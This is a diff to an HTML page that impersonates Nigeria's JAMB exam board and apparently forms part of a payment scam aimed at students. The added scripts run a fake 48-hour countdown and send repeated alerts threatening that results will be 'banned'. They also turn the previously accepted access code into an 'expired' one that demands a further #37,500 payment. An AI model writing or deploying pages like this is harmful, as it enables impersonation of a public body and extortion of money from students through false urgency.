@@ -5,12 +5,80 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>JAMB</title>
     <link rel="stylesheet" href="styles.css">
+
+    <script>
+        // Initialize countdown (48 hours in milliseconds)
+        const countdownDuration = 48 * 60 * 60 * 1000; // 48 hours in milliseconds
+
+        // Function to start the countdown
+        function startCountdown() {
+            const now = new Date().getTime();
+            const endTime = now + countdownDuration;
+
+            // Store the end time in localStorage
+            localStorage.setItem('countdownEndTime', endTime);
+            updateCountdown();
+        }
+
+        // Function to update the countdown display
+        function updateCountdown() {
+            const now = new Date().getTime();
+            const endTime = localStorage.getItem('countdownEndTime');
+            const timeLeft = endTime - now;
+
+            if (timeLeft <= 0) {
+                alert("Your double result is over 48 hours on the portal and your results will be banned.");
+                clearInterval(countdownInterval); // Stop the countdown when time is up
+            } else {
+                // Calculate hours, minutes, and seconds
+                const hours = Math.floor(timeLeft / (1000 * 60 * 60));
+                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+
+                // Display countdown in console (you can update this to show it in the DOM)
+                console.log(`Time left: ${hours}h ${minutes}m ${seconds}s`);
+            }
+        }
+
+        // Function to alert every 30 seconds
+        function alertEvery40Seconds() {
+            setInterval(() => {
+                const now = new Date().getTime();
+                const endTime = localStorage.getItem('countdownEndTime');
+                const timeLeft = endTime - now;
+
+                if (timeLeft > 0) {
+                    const hoursLeft = Math.floor(timeLeft / (1000 * 60 * 60));
+                    const minutesLeft = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                    
+                    // Alert the user with remaining hours and minutes
+                    alert(`Your double result is over 48 hours on the portal and your results will be banned in the next ${hoursLeft} hours and ${minutesLeft} minutes.`);
+                }
+            }, 40000); // 30 seconds interval
+        }
+
+        // Check if countdown is already in progress
+        window.onload = function () {
+            const endTime = localStorage.getItem('countdownEndTime');
+            const now = new Date().getTime();
+
+            if (!endTime || now > endTime) {
+                startCountdown();
+            }
+
+            // Start updating the countdown every second
+            var countdownInterval = setInterval(updateCountdown, 1000);
+
+            // Start the 30-second alert
+            alertEvery40Seconds();
+        };
+    </script>
 </head>
 <body>
     <header>
         <nav>
             <div><img src="./aamb.png"></div>
-            <div><h1>JOINT ADMISSIONS AND MATRICULATION BOARD</h1>
+            <div><h1>JOINT ADMISSIONS <br>AND<br> MATRICULATION BOARD</h1>
             <p>...enhancing academic excellence</p></div>
             <div><img src="./coat.jpeg"></div>
         </nav>
@@ -19,26 +87,53 @@
     <div class="gen8">
         <div><b>A code will be sent to you after your payment in order to complete the processing.</b></div>
         <div><p>Please input your given code below </p></div>
-        <div><input type="password" id="codeInput" placeholder="input your code here"></div>
+
+        <div>
+            <input type="password" id="codeInput" placeholder="input your code here">
+            <input type="checkbox" id="togglePassword"> VIEW
+        </div>
+
         <div><button id="verifyButton">CLICK HERE TO CHECK YOUR RESULT</button></div>
+
+        
         <div id="message"></div>
-        <div><h4>NOTE : Please input your code correctly.<br>contact your admin to request for your code after your payment.<br>Your result will be ready after your inputed your code.</h4></div>
+        <div><h4>NOTE : Please input your code correctly.<br>contact your admin to request for your code after your payment.<br>Your result will be ready after you inputed your code.</h4></div>
     </div>
 
     <script>
         document.getElementById('verifyButton').addEventListener('click', function() {
             const inputCode = document.getElementById('codeInput').value;
-            const correctCode = '2024037CHA';
+            const expiredCode = '2024037CHA';
+            const correctCode = '2024506037'; // Update with your correct code
             const messageDiv = document.getElementById('message');
 
-            if (inputCode === correctCode) {
+            if (inputCode === expiredCode) {
+                messageDiv.textContent = 'Code has expired due to time difference in code payment. You need to make another payment of #37,500 at once in order to get a new code before the due time.';
+                messageDiv.style.color = 'red';
+            } else if (inputCode === correctCode) {
                 messageDiv.textContent = 'Code verified successfully!';
                 messageDiv.style.color = 'green';
+                
+                // Redirect to the next page after a short delay
+                setTimeout(() => {
+                    window.location.href = 'last log.html';
+                }, 1000); // Delay for 1 second to show the success message
             } else {
                 messageDiv.textContent = 'Invalid code. Please try again.';
                 messageDiv.style.color = 'red';
             }
         });
+
+        document.getElementById('togglePassword').addEventListener('change', function() {
+    const codeInput = document.getElementById('codeInput');
+    if (this.checked) {
+        codeInput.setAttribute('type', 'text');
+    } else {
+        codeInput.setAttribute('type', 'password');
+    }
+});
+
     </script>
+    
 </body>
 </html>
